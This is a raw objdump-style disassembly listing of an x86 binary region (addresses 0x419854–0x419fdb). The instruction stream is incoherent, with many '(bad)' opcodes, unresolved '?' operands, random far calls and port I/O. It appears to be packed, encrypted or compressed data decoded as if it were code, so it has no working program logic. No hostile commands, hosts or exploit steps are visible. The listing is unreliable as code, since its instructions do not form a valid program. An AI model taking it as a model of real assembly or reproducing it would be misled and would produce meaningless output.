  419854:	cdq    
  419855:	mov    eax,DWORD PTR [ebx-0x2e]
  419858:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419859:	xor    al,0x5e
  41985b:	int    0xaa
  41985d:	cmp    edi,DWORD PTR [ebx]
  41985f:	sub    edx,esi
  419861:	cmp    eax,0xaab4de65
  419866:	dec    ebp
  419867:	aad    0xc5
  419869:	mov    ebx,0xe34b8a24
  41986e:	and    al,0xa6
  419870:	bound  edi,QWORD PTR [ecx+0x7fd2996]
  419876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419877:	adc    bh,bh
  419879:	inc    esp
  41987a:	bound  ebx,QWORD PTR [esi+0x35dae230]
  419880:	(bad)  
  419881:	repnz mov ebp,DWORD PTR [edx]
  419884:	outs   dx,DWORD PTR ds:[esi]
  419885:	mov    edi,0x392ca7cd
  41988a:	dec    ebp
  41988b:	imul   ebx,eax,0xffffffed
  41988e:	imul   ebp,DWORD PTR [esi+0x78],0x1
  419892:	push   ebp
  419893:	dec    eax
  419894:	push   esi
  419895:	ss mov edi,0xcf12041e
  41989b:	xchg   ecx,eax
  41989c:	sbb    BYTE PTR [eax+0x2221b779],ch
  4198a2:	lahf   
  4198a3:	lods   eax,DWORD PTR ds:[esi]
  4198a4:	mov    ebx,edi
  4198a6:	mov    esi,0x73e77904
  4198ab:	or     BYTE PTR [edx-0xa9e703c],0x1b
  4198b2:	mov    esi,0xbe2bb68b
  4198b7:	retf   0xb04d
  4198ba:	data16 std 
  4198bc:	shl    bh,cl
  4198be:	retf   0xa01d
  4198c1:	and    DWORD PTR [edx+0x508560fe],edi
  4198c7:	stc    
  4198c8:	sbb    eax,0xa1b04d61
  4198cd:	sahf   
  4198ce:	addr16 mov dh,0x6b
  4198d1:	mov    ds:0xbd36184a,al
  4198d6:	data16 mov bh,0x23
  4198d9:	pusha  
  4198da:	std    
  4198db:	das    
  4198dc:	aam    0x2f
  4198de:	push   eax
  4198df:	std    
  4198e0:	repz jmp 0x419943
  4198e3:	inc    eax
  4198e4:	xchg   DWORD PTR ds:0x9fb8d70b,ebx
  4198ea:	sbb    dl,bh
  4198ec:	outs   dx,BYTE PTR ds:[esi]
  4198ed:	add    edi,DWORD PTR [edi]
  4198ef:	dec    ebp
  4198f0:	test   al,0x98
  4198f2:	adc    al,0xdd
  4198f4:	hlt    
  4198f5:	imul   esi,edi,0x15
  4198f8:	ins    BYTE PTR es:[edi],dx
  4198f9:	dec    esi
  4198fa:	or     al,0x76
  4198fc:	sub    DWORD PTR [eax-0x10dba051],0x3
  419903:	rol    BYTE PTR [edx+0x5b],0xa4
  419907:	loopne 0x419961
  419909:	dec    ebx
  41990a:	cmp    al,0xef
  41990c:	and    al,0xab
  41990e:	dec    ebx
  41990f:	lods   eax,DWORD PTR ds:[esi]
  419910:	jo     0x419899
  419912:	lods   eax,DWORD PTR ds:[esi]
  419913:	js     0x4198c7
  419915:	pop    eax
  419916:	mov    es,WORD PTR [esi]
  419918:	les    ebx,FWORD PTR [esi-0x7b0112b3]
  41991e:	pop    esi
  41991f:	xchg   ecx,eax
  419920:	scas   eax,DWORD PTR es:[edi]
  419921:	cmp    al,0xf7
  419923:	out    dx,eax
  419924:	fstp   DWORD PTR [ebp+0x9ebf8b3]
  41992a:	stc    
  41992b:	mov    ds,WORD PTR ds:[ebx-0x49]
  41992f:	jge    0x4198be
  419931:	or     BYTE PTR [ebp-0x66],ah
  419934:	and    BYTE PTR [edi+0x4b1af4ec],0x8a
  41993b:	hlt    
  41993c:	int3   
  41993d:	leave  
  41993e:	leave  
  41993f:	sbb    al,0x69
  419941:	push   ecx
  419942:	mov    cl,0x81
  419944:	pop    ss
  419945:	ss (bad) 
  419948:	xchg   edx,eax
  419949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41994a:	test   eax,0xe1134860
  41994f:	jmp    0x419961
  419951:	xchg   ebx,eax
  419952:	(bad)  
  419953:	out    dx,al
  419954:	add    BYTE PTR [eax],al
  419956:	sbb    ah,0xd0
  419959:	ret    0xb75c
  41995c:	mov    ebx,0xf730373a
  419961:	mov    bl,0x6f
  419963:	jge    0x41992b
  419965:	call   0x3bc2:0x677d4f19
  41996c:	pop    eax
  41996d:	sar    BYTE PTR [esi+0x0],0x1e
  419971:	in     al,dx
  419972:	inc    ebx
  419973:	and    ebx,DWORD PTR [eax+0xc]
  419976:	jecxz  0x419913
  419978:	ds pushf 
  41997a:	std    
  41997b:	mov    BYTE PTR [edi+0x8],bl
  41997e:	pushf  
  41997f:	fs (bad) 
  419981:	(bad)  
  419982:	jge    0x41992c
  419984:	out    0xfb,eax
  419986:	sub    eax,DWORD PTR [edx+eax*1-0x7d3d3e2d]
  41998d:	xchg   BYTE PTR [eax+eax*4-0x65],bl
  419991:	mov    dh,0x19
  419993:	xchg   esi,eax
  419994:	mov    WORD PTR [edi],es
  419996:	pop    es
  419997:	push   edx
  419998:	shr    BYTE PTR [edi+ebp*4-0x42],1
  41999c:	xchg   ebx,eax
  41999d:	cmc    
  41999e:	ins    BYTE PTR es:[edi],dx
  41999f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a0:	in     al,dx
  4199a1:	pop    edx
  4199a2:	sub    bh,0xa
  4199a5:	sub    BYTE PTR [ecx-0x10],0x9a
  4199a9:	in     eax,0x55
  4199ab:	pop    eax
  4199ac:	int3   
  4199ad:	fcomi  st,st(1)
  4199af:	or     esi,DWORD PTR [ecx]
  4199b1:	hlt    
  4199b2:	loope  0x4199fc
  4199b4:	push   es
  4199b5:	jmp    0x41993d
  4199b7:	push   es
  4199b8:	mov    eax,0x997db281
  4199bd:	dec    eax
  4199be:	or     esp,DWORD PTR [edi+0x34]
  4199c1:	cdq    
  4199c2:	add    dl,BYTE PTR [ecx]
  4199c4:	in     eax,dx
  4199c5:	sub    eax,0xb06a86c0
  4199ca:	sbb    eax,0xb8523de4
  4199cf:	sti    
  4199d0:	sti    
  4199d1:	mov    ch,0xe0
  4199d3:	frstor [ebx]
  4199d5:	mov    dh,0xcd
  4199d7:	pop    ss
  4199d8:	in     al,0x35
  4199da:	push   0x58
  4199dc:	or     al,0x35
  4199de:	arpl   WORD PTR [edx+eax*1-0x4691af9],bp
  4199e5:	mov    edi,0xd9a9b22b
  4199ea:	mov    esp,0x56d17255
  4199ef:	sahf   
  4199f0:	fsub   DWORD PTR [edx]
  4199f2:	push   ebp
  4199f3:	jnp    0x419a40
  4199f5:	pop    ecx
  4199f6:	xor    ebx,DWORD PTR [ebp+0x77b454bb]
  4199fc:	jo     0x419a4b
  4199fe:	das    
  4199ff:	imul   ebx,DWORD PTR [ecx-0x41fd46c6],0x59
  419a06:	jns    0x419997
  419a08:	pop    ebp
  419a09:	xchg   BYTE PTR [esi+eiz*2-0x660f475d],ah
  419a10:	jns    0x4199a7
  419a12:	adc    esi,DWORD PTR [ebx+0x7e6bda3d]
  419a18:	cmp    al,0x24
  419a1a:	pop    ebp
  419a1b:	in     eax,0xfe
  419a1d:	xchg   ebx,eax
  419a1e:	ret    
  419a1f:	xor    al,0xc4
  419a21:	jg     0x4199eb
  419a23:	adc    BYTE PTR [edx-0x3c],dl
  419a26:	jnp    0x4199d4
  419a28:	jmp    DWORD PTR [ebx]
  419a2a:	cli    
  419a2b:	fwait
  419a2c:	xchg   ecx,eax
  419a2d:	push   ss
  419a2e:	or     ebp,edi
  419a30:	jo     0x4199c2
  419a32:	push   esp
  419a33:	in     eax,0x74
  419a35:	fnstsw ax
  419a37:	inc    edi
  419a38:	daa    
  419a39:	jne    0x419a94
  419a3b:	popf   
  419a3c:	sbb    ch,BYTE PTR [edi-0x74b032aa]
  419a42:	enter  0x572c,0x7a
  419a46:	shl    BYTE PTR [ebp-0x3a],1
  419a49:	in     al,dx
  419a4a:	scas   eax,DWORD PTR es:[edi]
  419a4b:	rcl    BYTE PTR ds:0xe70a86d3,0x3d
  419a52:	push   esi
  419a53:	jne    0x419aac
  419a55:	mov    dh,0x26
  419a57:	(bad)
  419a5a:	stos   DWORD PTR es:[edi],eax
  419a5b:	dec    ebx
  419a5c:	sub    dl,dh
  419a5e:	or     al,0x96
  419a60:	inc    ebx
  419a61:	sub    eax,DWORD PTR [ecx-0x48]
  419a64:	mov    ecx,0x87b1fb3d
  419a69:	or     DWORD PTR [ebx-0x12],0xf3118d9a
  419a70:	add    bl,cl
  419a72:	test   BYTE PTR [esi],bh
  419a74:	mov    al,ds:0x37cc09f9
  419a79:	push   eax
  419a7a:	push   es
  419a7b:	mov    al,0xc6
  419a7d:	out    dx,al
  419a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a7f:	dec    ebp
  419a80:	cmp    al,0xe2
  419a82:	inc    esi
  419a83:	call   0x8525:0x95f93296
  419a8a:	sub    BYTE PTR [esp+eax*2],0x55
  419a8e:	pop    ds
  419a8f:	inc    edi
  419a90:	mov    esi,0xf41436f7
  419a95:	mov    ah,0xe2
  419a97:	popa   
  419a98:	fidivr WORD PTR [ecx-0x34]
  419a9b:	aaa    
  419a9c:	fmul   QWORD PTR ds:0xe79356ea
  419aa2:	call   0x5630fc38
  419aa7:	mov    bl,0x7f
  419aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aaa:	mov    dh,al
  419aac:	fdivr  DWORD PTR [ecx-0x18]
  419aaf:	js     0x419abc
  419ab1:	enter  0x4703,0x8f
  419ab5:	mov    dl,0xf6
  419ab7:	jmp    0x9c24f467
  419abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419abd:	xor    esp,esp
  419abf:	dec    edx
  419ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac1:	dec    esi
  419ac2:	or     bl,BYTE PTR [esi-0x3a]
  419ac5:	push   ebx
  419ac6:	dec    esi
  419ac7:	sub    BYTE PTR [ebx],0xa2
  419aca:	inc    esp
  419acb:	fistp  WORD PTR [edi+0x73584677]
  419ad1:	mov    dl,0xa9
  419ad3:	mov    dl,0xd4
  419ad5:	sbb    BYTE PTR [edi+ecx*8],bh
  419ad8:	pop    ebx
  419ad9:	sbb    eax,0xe150aa5f
  419ade:	sub    ah,ch
  419ae0:	pop    ebx
  419ae1:	adc    BYTE PTR [edx-0x43b79eb5],ah
  419ae7:	xlat   BYTE PTR ds:[ebx]
  419ae8:	enter  0x7274,0x95
  419aec:	std    
  419aed:	sub    ecx,DWORD PTR [ebp+esi*2-0x35]
  419af1:	pop    edi
  419af2:	jno    0x419b0e
  419af4:	mov    esp,0x1d14b97f
  419af9:	xchg   edx,eax
  419afa:	pop    eax
  419afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419afc:	pop    edi
  419afd:	jle    0x419abe
  419aff:	pop    esi
  419b01:	sub    ecx,DWORD PTR [esi-0x20]
  419b04:	add    ebx,DWORD PTR [ebp+0x325b1b88]
  419b0a:	pop    ecx
  419b0b:	jo     0x419b77
  419b0d:	adc    BYTE PTR [esi],al
  419b0f:	pop    edi
  419b10:	or     bl,ch
  419b12:	xor    ecx,DWORD PTR [ebp+0x454673b]
  419b18:	iret   
  419b19:	xchg   esp,eax
  419b1a:	call   0x3ee4b5fe
  419b1f:	shl    DWORD PTR ds:0x719e6aeb,cl
  419b25:	mov    bl,0x99
  419b27:	call   0x3391:0xa0ed77ba
  419b2e:	dec    eax
  419b2f:	ret    
  419b30:	mov    ecx,0x896334a5
  419b35:	mov    esi,eax
  419b37:	pop    es
  419b38:	or     ch,BYTE PTR [edi-0x435de235]
  419b3e:	pop    ss
  419b3f:	mov    bl,0xd9
  419b41:	fs dec ebx
  419b43:	(bad)  
  419b44:	mov    ds:0x841b0848,eax
  419b49:	pop    eax
  419b4a:	(bad)  
  419b4b:	loope  0x419ad2
  419b4d:	test   DWORD PTR [ecx],ebp
  419b4f:	jo     0x419b59
  419b51:	xchg   esi,eax
  419b52:	or     DWORD PTR [edi],ecx
  419b54:	sti    
  419b55:	aas    
  419b56:	push   ds
  419b57:	clc    
  419b58:	and    BYTE PTR [edi],0x60
  419b5b:	xchg   edx,eax
  419b5c:	sbb    ecx,ecx
  419b5e:	cwde   
  419b5f:	leave  
  419b60:	imul   esp,DWORD PTR [edx],0x41
  419b63:	sub    dh,BYTE PTR [ecx-0x5f]
  419b66:	push   ds
  419b67:	jp     0x419b82
  419b69:	push   edx
  419b6a:	js     0x419b80
  419b6c:	in     eax,dx
  419b6d:	xchg   ebp,eax
  419b6e:	push   ebx
  419b6f:	arpl   WORD PTR [ebx+0x41],bx
  419b72:	test   DWORD PTR [ebp+0xc45c934],0x55cc5d22
  419b7c:	adc    edi,DWORD PTR [esi-0xa08ae28]
  419b82:	mov    gs,WORD PTR [edx]
  419b84:	sub    eax,0xef59e1c2
  419b89:	pop    edx
  419b8a:	jbe    0x419baa
  419b8c:	xor    DWORD PTR [ecx-0x5d],eax
  419b8f:	mov    ebx,0xbe754c63
  419b94:	adc    DWORD PTR [ecx],ebp
  419b96:	pop    edx
  419b97:	(bad)  
  419b98:	jle    0x419bcb
  419b9a:	xchg   esi,eax
  419b9b:	lods   al,BYTE PTR ds:[esi]
  419b9c:	sbb    DWORD PTR [ecx-0x28],esp
  419b9f:	inc    edi
  419ba0:	pushf  
  419ba1:	call   0x50f56c15
  419ba6:	scas   al,BYTE PTR es:[edi]
  419ba7:	(bad)  
  419ba8:	xor    ebp,DWORD PTR [ecx+0x7048f43f]
  419bae:	mov    BYTE PTR [eax+0xf],ch
  419bb1:	dec    ebx
  419bb2:	in     eax,0xb7
  419bb4:	xchg   edi,eax
  419bb5:	jno    0x419b55
  419bb7:	idiv   dl
  419bb9:	cwde   
  419bba:	jb     0x419b56
  419bbc:	mov    bh,0x43
  419bbe:	retf   0x2ad0
  419bc1:	dec    ebx
  419bc2:	in     eax,0xd9
  419bc4:	(bad)  
  419bc5:	imul   esi,DWORD PTR ds:0xbab4cdd0,0xfffffffd
  419bcc:	call   0x68487cde
  419bd1:	sbb    DWORD PTR [ecx-0x59],ecx
  419bd4:	pop    es
  419bd5:	lods   al,BYTE PTR ds:[esi]
  419bd6:	(bad)  
  419bd7:	ins    DWORD PTR es:[edi],dx
  419bd8:	in     al,dx
  419bd9:	ins    BYTE PTR es:[edi],dx
  419bda:	pop    eax
  419bdb:	push   es
  419bdc:	jae    0x419b8d
  419bde:	sti    
  419bdf:	mov    esp,0xa496b035
  419be4:	popf   
  419be5:	adc    ch,BYTE PTR [esi+0x702266c2]
  419beb:	adc    dl,BYTE PTR [edx+eiz*2-0x2da4d346]
  419bf2:	retf   
  419bf3:	and    BYTE PTR [esi],bl
  419bf5:	inc    esp
  419bf6:	sbb    BYTE PTR [eax+0x18bfd50d],dl
  419bfc:	sub    BYTE PTR [ebx],ch
  419bfe:	iret   
  419bff:	dec    ebp
  419c00:	popa   
  419c01:	cli    
  419c02:	sbb    eax,0x4e3490c3
  419c07:	jo     0x419bfb
  419c09:	jl     0x419c70
  419c0b:	sbb    cl,BYTE PTR ds:0x7c0fc77e
  419c11:	out    dx,eax
  419c12:	mov    edi,0xabac1851
  419c17:	xor    al,0x3f
  419c19:	test   al,0x31
  419c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c1c:	push   es
  419c1d:	inc    ecx
  419c1e:	fadd   QWORD PTR [edi]
  419c20:	hlt    
  419c21:	int    0x39
  419c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c24:	jle    0x419bc0
  419c26:	sbb    al,0xf5
  419c28:	dec    edi
  419c29:	and    DWORD PTR [ebx],edi
  419c2b:	mov    eax,ds:0xa9d4a2a3
  419c30:	in     al,dx
  419c31:	pop    ebp
  419c32:	jb     0x419c4c
  419c34:	sti    
  419c35:	lods   eax,DWORD PTR ds:[esi]
  419c36:	jno    0x419be6
  419c38:	adc    DWORD PTR [edx+edi*4],esi
  419c3b:	mov    ebx,0xa50dc590
  419c40:	out    dx,eax
  419c41:	stos   BYTE PTR es:[edi],al
  419c42:	sbb    bh,BYTE PTR [ebx]
  419c44:	fnstcw WORD PTR [edx-0x20179745]
  419c4a:	imul   ebp,DWORD PTR ss:[ebp-0x38],0x93563024
  419c52:	xor    esp,edx
  419c54:	ss mov ecx,0xa36b590
  419c5a:	jns    0x419c0d
  419c5c:	inc    esp
  419c5d:	shr    BYTE PTR [ecx+0x6c],0xec
  419c61:	and    BYTE PTR [eax-0x51],al
  419c64:	cmp    edi,esi
  419c66:	mov    cl,0x32
  419c68:	imul   eax,DWORD PTR [ebp-0x50],0x7
  419c6c:	outs   dx,DWORD PTR ds:[esi]
  419c6d:	sahf   
  419c6e:	push   esp
  419c6f:	loopne 0x419c87
  419c71:	leave  
  419c72:	jle    0x419c17
  419c74:	or     esi,DWORD PTR [eax+0x51]
  419c77:	xchg   ebx,eax
  419c78:	call   0xa5b6521
  419c7d:	ror    ebx,1
  419c7f:	sbb    al,0x4c
  419c81:	xor    bh,BYTE PTR [ecx+edi*1-0x6a]
  419c85:	ss int3 
  419c87:	jle    0x419c42
  419c89:	mov    BYTE PTR [eax],0x99
  419c8c:	cli    
  419c8d:	add    ah,ch
  419c8f:	mov    eax,fs:0xef8278af
  419c95:	mov    eax,?
  419c97:	dec    ebp
  419c98:	jb     0x419c8b
  419c9a:	not    DWORD PTR [ecx]
  419c9c:	js     0x419d16
  419c9e:	mov    bh,BYTE PTR [esp+ebx*8-0x79]
  419ca2:	adc    al,0xa4
  419ca4:	fwait
  419ca5:	dec    ebp
  419ca6:	pop    ecx
  419ca7:	cmp    BYTE PTR [edx],al
  419ca9:	call   0x2ac:0xcb0ed426
  419cb0:	adc    BYTE PTR [esi+0x2a],dl
  419cb3:	xchg   BYTE PTR [esi],cl
  419cb5:	aas    
  419cb6:	pop    ds
  419cb7:	pop    ebx
  419cb8:	or     eax,0x7c31ffff
  419cbd:	call   0x11d44229
  419cc2:	cmc    
  419cc3:	sub    eax,0xe7c0c990
  419cc8:	push   es
  419cc9:	test   dh,al
  419ccb:	add    bh,BYTE PTR [esp+edi*8]
  419cce:	aad    0x81
  419cd0:	popf   
  419cd1:	stc    
  419cd2:	add    al,0xe5
  419cd4:	cmc    
  419cd5:	jmp    0x419ce4
  419cd7:	in     al,0x69
  419cd9:	fwait
  419cda:	mov    es,WORD PTR [esi-0x3fd1db7a]
  419ce0:	inc    eax
  419ce1:	dec    ebp
  419ce2:	stos   BYTE PTR es:[edi],al
  419ce3:	jle    0x419cdf
  419ce5:	sti    
  419ce6:	das    
  419ce7:	jb     0x419d00
  419ce9:	bound  ecx,QWORD PTR [ebp+0x7d]
  419cec:	dec    esi
  419ced:	out    dx,eax
  419cee:	and    dl,BYTE PTR [ebx+0x43]
  419cf1:	pushf  
  419cf2:	push   0x7fd7786b
  419cf7:	mov    ss,WORD PTR [edx+0x66]
  419cfa:	imul   ecx,esp,0x70
  419cfd:	inc    edi
  419cfe:	(bad)  
  419cff:	repz pop esi
  419d01:	jmp    0x997a6e77
  419d06:	fadd   QWORD PTR [ebx+0x699e68d6]
  419d0c:	mov    edi,?
  419d0e:	mov    esi,0x357fa0e5
  419d13:	sub    eax,0x2f89c2b2
  419d18:	or     BYTE PTR [edi-0x57ab6764],bh
  419d1e:	cmc    
  419d1f:	mov    ebx,DWORD PTR [edx-0xf]
  419d22:	scas   eax,DWORD PTR es:[edi]
  419d23:	repnz leave 
  419d25:	inc    ecx
  419d26:	out    0xb6,al
  419d28:	or     BYTE PTR [ebx+ebp*8-0x7bf57a2f],al
  419d2f:	mov    dl,0x36
  419d31:	dec    ecx
  419d32:	xor    eax,0xc9973c43
  419d37:	pop    esp
  419d38:	test   eax,0x1043616d
  419d3d:	adc    BYTE PTR [edx+0x57e6a49f],0x4e
  419d44:	and    BYTE PTR [edi],ah
  419d46:	jp     0x419ce9
  419d48:	sbb    al,0x1f
  419d4a:	mov    al,ds:0x5796cbce
  419d4f:	push   0x8f035e39
  419d54:	push   eax
  419d55:	inc    eax
  419d56:	pop    es
  419d57:	jno    0x419d6e
  419d59:	clc    
  419d5a:	scas   eax,DWORD PTR es:[edi]
  419d5b:	jae    0x419cf8
  419d5d:	stos   DWORD PTR es:[edi],eax
  419d5e:	sub    edx,DWORD PTR [ebx-0x675c001d]
  419d64:	aad    0x9f
  419d66:	mov    al,ds:0xa0b6453a
  419d6b:	jg     0x419dce
  419d6d:	call   0x2ed:0x9d95e757
  419d74:	lds    eax,FWORD PTR ds:[eax]
  419d77:	ret    0x7c71
  419d7a:	ficomp WORD PTR [ebp+0x72f4868f]
  419d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d81:	out    0x25,al
  419d83:	out    dx,eax
  419d84:	scas   eax,DWORD PTR es:[edi]
  419d85:	mov    BYTE PTR [ebx],0xab
  419d88:	xchg   ebp,eax
  419d89:	and    esp,DWORD PTR [ebx-0x66]
  419d8c:	(bad)  
  419d8d:	xor    DWORD PTR ss:[eax+0xc5e60be],ebp
  419d94:	jecxz  0x419ddf
  419d96:	std    
  419d97:	pop    ebp
  419d98:	jmp    0x5ad98719
  419d9d:	and    ecx,DWORD PTR [eax]
  419d9f:	ins    BYTE PTR es:[edi],dx
  419da0:	ds push eax
  419da2:	pop    edi
  419da3:	(bad)  
  419da4:	aaa    
  419da5:	mov    BYTE PTR [edx-0x775d5f5f],bh
  419dab:	pop    esi
  419dac:	sub    al,0xf5
  419dae:	vandnps ymm2,ymm2,YMMWORD PTR [edi]
  419db2:	or     eax,0x42db9690
  419db7:	(bad)  
  419db8:	imul   edi,DWORD PTR [edi-0xc4f9bf6],0x5fb51604
  419dc2:	push   ss
  419dc3:	stos   BYTE PTR es:[edi],al
  419dc4:	imul   ebx,DWORD PTR [edx],0x40f4ff16
  419dca:	retf   
  419dcb:	pop    ebp
  419dcc:	push   ecx
  419dcd:	fs pop eax
  419dcf:	retf   0x73a
  419dd2:	jmp    0x6c705965
  419dd7:	sahf   
  419dd8:	inc    ecx
  419dd9:	hlt    
  419dda:	mov    ?,WORD PTR [ebx+0x4acfbb2c]
  419de0:	repz add al,0x74
  419de3:	test   BYTE PTR [eax-0x7a45d4a],cl
  419de9:	mov    ebp,0x8a7ec8c4
  419dee:	push   esi
  419def:	lahf   
  419df0:	in     al,dx
  419df1:	jns    0x419e0b
  419df3:	addr16 pop ebp
  419df5:	jae    0x419e48
  419df7:	or     BYTE PTR [edx-0xa3fa5fd],dl
  419dfd:	mov    dl,0x9b
  419dff:	stos   BYTE PTR es:[edi],al
  419e00:	dec    esp
  419e01:	sbb    bh,BYTE PTR [ecx+0x4ab57de6]
  419e07:	mov    eax,ds:0x15052b7e
  419e0c:	leave  
  419e0d:	fld    TBYTE PTR [esi]
  419e0f:	inc    ebp
  419e10:	xchg   ebx,eax
  419e11:	adc    esp,DWORD PTR [ebp+0x11]
  419e14:	lods   eax,DWORD PTR ds:[esi]
  419e15:	fwait
  419e16:	push   0xffffffe5
  419e18:	xchg   edx,eax
  419e19:	jnp    0x419e8d
  419e1b:	retf   
  419e1c:	imul   BYTE PTR [esi-0x5477198d]
  419e22:	jbe    0x419e66
  419e24:	mov    DWORD PTR [edx],0x3d324a6c
  419e2a:	adc    al,0xff
  419e2c:	sbb    BYTE PTR [edx],ch
  419e2e:	iretw  
  419e30:	push   0xad2e4b7
  419e35:	adc    al,0xd8
  419e37:	or     DWORD PTR [esi+0x4ae95660],esi
  419e3d:	jae    0x419dd2
  419e3f:	fmul   DWORD PTR [ebp-0x6e]
  419e42:	mov    al,0xd
  419e44:	gs dec eax
  419e46:	inc    ebx
  419e47:	xor    eax,0x85d97fd
  419e4c:	push   edx
  419e4d:	int    0xe7
  419e4f:	loop   0x419ea9
  419e51:	out    dx,al
  419e52:	pop    ebp
  419e53:	in     al,0x50
  419e55:	sbb    ch,ch
  419e57:	test   esp,edx
  419e59:	adc    edx,DWORD PTR [edx+edi*4-0x37311d80]
  419e60:	out    dx,al
  419e61:	lods   eax,DWORD PTR ds:[esi]
  419e62:	jb     0x419ea6
  419e64:	xor    DWORD PTR [edi+0x4d],ebp
  419e67:	pop    ecx
  419e68:	push   eax
  419e69:	gs daa 
  419e6b:	xor    eax,0x322809d
  419e70:	icebp  
  419e71:	(bad)  
  419e72:	push   ss
  419e73:	les    ebx,FWORD PTR [ebx-0x5126a37e]
  419e79:	sbb    eax,edi
  419e7b:	into   
  419e7c:	push   0x2b
  419e7e:	push   0x18
  419e80:	sbb    bh,BYTE PTR [esi-0x34]
  419e83:	scas   al,BYTE PTR es:[edi]
  419e84:	inc    ecx
  419e85:	cs xor eax,0x8fb2c9e6
  419e8b:	sbb    eax,0xdccc246d
  419e90:	push   esp
  419e91:	out    0x96,eax
  419e93:	daa    
  419e94:	dec    esp
  419e95:	push   ebx
  419e96:	xor    esi,ecx
  419e98:	aam    0x7f
  419e9a:	adc    cl,BYTE PTR [edx+eiz*1-0x35]
  419e9e:	in     al,dx
  419e9f:	out    dx,al
  419ea0:	cmp    esp,ecx
  419ea2:	scas   eax,DWORD PTR es:[edi]
  419ea3:	rcl    DWORD PTR [ebx+ecx*4-0x5c],1
  419ea7:	stc    
  419ea8:	mov    eax,0xf9787714
  419ead:	iret   
  419eae:	xchg   ebx,eax
  419eaf:	jae    0x419e8a
  419eb1:	mov    eax,eax
  419eb3:	or     DWORD PTR [ebp+0x101c6e7c],0x47d4152d
  419ebd:	int    0x81
  419ebf:	mov    ds:0xaa00b081,eax
  419ec4:	out    dx,al
  419ec5:	jg     0x419e78
  419ec7:	fwait
  419ec8:	mov    cl,0xea
  419ecb:	pop    ss
  419ecc:	les    esi,FWORD PTR [edi]
  419ece:	retf   
  419ecf:	jno    0x419e72
  419ed1:	dec    ebp
  419ed2:	jb     0x419ef2
  419ed4:	in     eax,dx
  419ed5:	jecxz  0x419f4f
  419ed7:	loopne 0x419e66
  419ed9:	repnz pop ebp
  419edb:	jg     0x419e80
  419edd:	jmp    FWORD PTR [eax]
  419edf:	daa    
  419ee0:	inc    esp
  419ee1:	(bad)  
  419ee2:	push   cs
  419ee3:	shl    DWORD PTR [ebx-0x32],1
  419ee6:	mov    ds:0x8455b175,al
  419eeb:	nop
  419eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419eed:	mov    dl,BYTE PTR [edi-0x70072178]
  419ef3:	sahf   
  419ef4:	lock xchg DWORD PTR gs:[ebx+0x2e],edi
  419ef9:	ja     0x419eeb
  419efb:	call   0xef307e0e
  419f00:	xchg   DWORD PTR [ecx-0x3f],ebp
  419f03:	mov    esp,0xc826b799
  419f08:	add    DWORD PTR [eax],edx
  419f0a:	jp     0x419ef9
  419f0c:	mov    al,ds:0x40b722f7
  419f11:	outs   dx,BYTE PTR ds:[esi]
  419f12:	shr    DWORD PTR [esp+eiz*4+0x12],0xf0
  419f17:	arpl   WORD PTR [esi+0x6296fe46],si
  419f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f1e:	scas   eax,DWORD PTR es:[edi]
  419f1f:	stos   DWORD PTR es:[edi],eax
  419f20:	mov    cl,0xc8
  419f22:	mov    edi,0xcb65d2da
  419f27:	popf   
  419f28:	inc    edi
  419f29:	cmp    esp,DWORD PTR [ebp+0x386b9494]
  419f2f:	and    BYTE PTR [esi-0x60c290ca],bl
  419f35:	daa    
  419f36:	arpl   WORD PTR [esi+ecx*2+0x4a8a0c39],di
  419f3d:	push   DWORD PTR [esi+0x5dd226fe]
  419f43:	jo     0x419ed1
  419f45:	push   edx
  419f46:	fnstenv [esi]
  419f48:	pop    ds
  419f49:	std    
  419f4a:	mov    esp,0x175887a3
  419f4f:	lea    esi,[ebx+0x20b0c837]
  419f55:	ja     0x419fc5
  419f57:	add    al,BYTE PTR [edx+0x4a2a2a7c]
  419f5d:	int    0xb7
  419f5f:	aam    0x9d
  419f61:	pop    eax
  419f62:	mov    cl,0x14
  419f64:	cmp    edi,DWORD PTR [edx]
  419f66:	mov    ds:0xa96d68ec,al
  419f6b:	and    ch,dh
  419f6d:	jmp    0xba9a5b27
  419f72:	in     eax,0xa5
  419f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f75:	dec    eax
  419f76:	lahf   
  419f77:	mov    ch,0x7
  419f79:	leave  
  419f7a:	loope  0x419ff8
  419f7c:	enter  0xc9ce,0xd3
  419f80:	mov    dh,BYTE PTR [edi]
  419f82:	jbe    0x419f24
  419f84:	int3   
  419f85:	data16 loope 0x419f6a
  419f88:	sbb    eax,0x4265b91
  419f8d:	fisttp QWORD PTR [esi+0x17bd76b6]
  419f93:	xor    eax,0x8670ec45
  419f98:	sub    DWORD PTR [ecx],ecx
  419f9a:	call   0x6f8a:0x9b1f8253
  419fa1:	adc    esi,0x2fbfd21b
  419fa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fa8:	popf   
  419fa9:	mov    BYTE PTR [ecx+esi*8-0x2a4e6e92],dh
  419fb0:	ret    
  419fb1:	std    
  419fb2:	pop    ds
  419fb3:	loop   0x419fa6
  419fb5:	jno    0x419ffa
  419fb7:	mov    esp,0xe3bb81b2
  419fbc:	out    0x83,eax
  419fbe:	and    bh,bl
  419fc0:	jns    0x419f7a
  419fc2:	push   cs
  419fc3:	pop    esi
  419fc4:	pop    esp
  419fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fc6:	and    BYTE PTR [edx+ebx*2],ch
  419fc9:	in     eax,0x7c
  419fcb:	pop    es
  419fcc:	mov    ds:0x99849201,eax
  419fd1:	fbld   TBYTE PTR [ebx+0x6a485610]
  419fd7:	sahf   
  419fd8:	jecxz  0x419fc4
  419fda:	ins    BYTE PTR es:[edi],dx
  419fdb:	(bad)  
